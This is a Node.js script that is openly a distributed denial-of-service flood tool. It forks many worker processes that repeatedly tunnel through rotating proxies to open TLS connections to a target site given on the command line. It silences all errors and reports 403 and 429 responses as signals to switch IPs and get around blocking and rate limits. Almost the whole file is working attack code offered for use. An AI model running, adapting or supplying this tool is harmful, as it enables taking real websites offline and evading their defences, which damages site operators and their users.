const url = require('url');
const cluster = require("cluster");
const http = require("http");
const tls = require("tls");

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
process.on('uncaughtException', function (er) {
    //console.error(er)
});
process.on('unhandledRejection', function (er) {
    //console.error(er)
});

var target_url = process.argv[2];
var delay = process.argv[3];
var threads = process.argv[4];
var proxys = process.argv[5].split(",");

if (cluster.isMaster) {
    for (var i = 0; i < threads; i++) {
        cluster.fork();
        console.log(`${i + 1} Thread Started`);
    }
    setTimeout(() => {
        process.exit(1);
    }, delay * 1000);
} else {
    console.log('Start flood!');
    startflood(target_url);
}


function getRandomElement(array) {
    var randomIndex = Math.floor(Math.random() * array.length);
    return array[randomIndex];
}


function startflood(page) {
    console.log('Start attack!');
    setInterval(() => {
        var proxy = getRandomElement(proxys).replace(/\n/g, "");
        var parsed = url.parse(page);
        var req = http.request({
            //set proxy session
            host: proxy.split(':')[0],
            port: proxy.split(':')[1],
            method: 'CONNECT',
            path: parsed.host + ":443"
        }, (err) => {
            req.end();
            return 1;
        });

        req.on('connect', function (res, socket, head) {
            var tlsConnection = tls.connect({
                host: parsed.host,
                servername: parsed.host,
                ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
                secureProtocol: ['TLSv1_2_method', 'TLSv1_3_method'],
                secure: true,
                requestCert: true,
                honorCipherOrder: true,
                secureOptions: "SSL_OP_ALL",
                rejectUnauthorized: false,
                socket: socket
            }, function () {
                tlsConnection.setKeepAlive(true, 10000);
                tlsConnection.setTimeout(10000);
                tlsConnection.end();
                tlsConnection.destroy();

            });
            tlsConnection.setEncoding('utf8');
            tlsConnection.on('error', function (data) {
                tlsConnection.end();
                //tlsConnection.destroy();
                //console.log(error);
            });
            tlsConnection.on('data', function (data) {
                tlsConnection.destroy();
                //console.log(data);
                if (data.includes("403 Forbidden")) {
                    console.log("Error bypass! Change ip!");
                    //tlsConnection.end();
                }
                if (data.includes("429 Too Many")) {
                    console.log("Rate limit! Change ip");
                    //tlsConnection.end();
                }
            });
        });
        req.end();
    });
}



